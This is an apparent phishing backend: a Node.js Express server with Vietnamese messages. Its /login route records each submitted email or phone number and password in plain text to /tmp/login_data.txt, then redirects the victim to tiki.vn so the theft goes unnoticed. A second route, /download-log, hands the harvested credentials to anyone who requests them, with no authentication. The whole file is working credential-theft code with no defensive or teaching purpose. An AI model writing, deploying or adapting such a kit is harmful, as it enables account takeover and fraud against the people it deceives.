const express = require("express");
const fs = require("fs");
const bodyParser = require("body-parser");
const path = require("path");

const app = express();
const port = 3000;
const logFilePath = path.join("/tmp", "login_data.txt");

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.use(express.static(path.join(__dirname, "public")));

app.post("/login", (req, res) => {
  const { emailOrPhone, password } = req.body;

  if (!emailOrPhone || !password) {
    return res
      .status(400)
      .json({ success: false, message: "Vui lòng nhập đủ thông tin." });
  }

  const logData = `Email/Số điện thoại: ${emailOrPhone}\nMật khẩu: ${password}\n-----------------------------\n`;

  // Debugging: In ra logData trước khi ghi vào tệp
  console.log("Dữ liệu cần ghi vào tệp:", logData);

  fs.appendFile(logFilePath, logData, (err) => {
    if (err) {
      console.error("Lỗi khi lưu thông tin:", err);
      return res.status(500).json({ success: false, message: "Lỗi server." });
    }
    console.log("Tệp đã được ghi thành công.");
    res.json({
      success: true,
      redirectUrl: "https://tiki.vn/",
    });
  });
});

app.get("/download-log", (req, res) => {
  const logFilePath = path.join("/tmp", "login_data.txt");
  console.log("Đường dẫn tệp:", logFilePath); // Debug đường dẫn tệp

  if (!fs.existsSync(logFilePath)) {
    console.log("Tệp không tồn tại."); // Debug thông báo nếu tệp không tồn tại
    return res
      .status(404)
      .json({ success: false, message: "Tệp không tìm thấy." });
  }

  res.download(logFilePath, "login_data.txt", (err) => {
    if (err) {
      console.error("Lỗi khi gửi tệp: ", err);
      return res
        .status(500)
        .json({ success: false, message: "Không thể tải tệp!" });
    }
    console.log("Tệp đã được gửi thành công.");
  });
});

// Route mặc định trả về trang login
app.get("/some-path", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Chạy server trên port 3000
app.listen(port, () => {
  console.log(`Server đang chạy tại http://localhost:${port}`);
});
